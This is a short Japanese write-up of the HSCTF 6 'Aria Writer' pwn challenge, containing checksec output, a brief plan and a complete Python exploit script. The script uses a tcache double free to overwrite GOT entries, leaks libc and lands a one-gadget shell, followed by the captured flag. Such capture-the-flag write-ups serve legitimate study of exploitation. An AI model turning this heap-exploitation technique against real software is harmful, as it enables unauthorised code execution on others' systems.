# [pwn 451pts] Aria Writer - HSCTF 6
64ビットでいろいろ有効です。
```
$ checksec -f aria-writer
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   79 Symbols     Yes	0		6	aria-writer
```

最初に名前を聞かれ、その後mallocとfreeをできるサービスです。
RELROが無効なので、freeのGOTに`puts@plt`を書き込み、mallocされるptrを`puts@got`にします。
最後にwriteやexitのGOTにone gadgetを書き込めば終わりです。
nameとかsecretは使わなくても解けるんだが......？

```python
from ptrlib import *

def alloc(size, data):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("> ")
    sock.sendline(str(size))
    sock.recvuntil("> ")
    sock.sendline(data)

def free():
    sock.recvuntil("> ")
    sock.sendline("2")

def secret():
    sock.recvuntil("> ")
    sock.sendline("3")

elf = ELF("./aria-writer")
libc = ELF("./libc-2.27.so")
#sock = Process("./aria-writer")
sock = Socket("pwn.hsctf.com", 2222)

plt_puts = 0x400750

# name
sock.recvuntil("> ")
sock.sendline("/bin/sh")

# double free for shell
alloc(0x38, "A")
free()
free()
alloc(0x38, p64(elf.got("write")))
alloc(0x38, "")

# double free for libc leak
alloc(0x28, "B")
free()
free()
alloc(0x28, p64(elf.symbol("global")))
alloc(0x28, "")

alloc(0x18, "C")
free()
free()
alloc(0x18, p64(elf.got("free")))
alloc(0x18, "")

# free@got = puts@plt
alloc(0x18, p64(plt_puts))

# global = puts@got
alloc(0x28, p64(elf.got("puts")))

# libc leak
free()
sock.recvline()
addr_puts = u64(sock.recvline().rstrip())
libc_base = addr_puts - libc.symbol("puts")
logger.info("libc base = " + hex(libc_base))

# write@got = one gadget
one_gadget = libc_base + 0x4f322
alloc(0x38, p64(one_gadget))

# get the shell!
secret()

sock.interactive()
```

わーい。
```
$ python solve.py 
[+] __init__: Successfully connected to pwn.hsctf.com:2222
[+] <module>: libc base = 0x7f66475cc000
[ptrlib]$ cat flag
secret name o: :[ptrlib]$ 
hsctf{1_should_tho}[ptrlib]$
```

# 感想
面白かったです。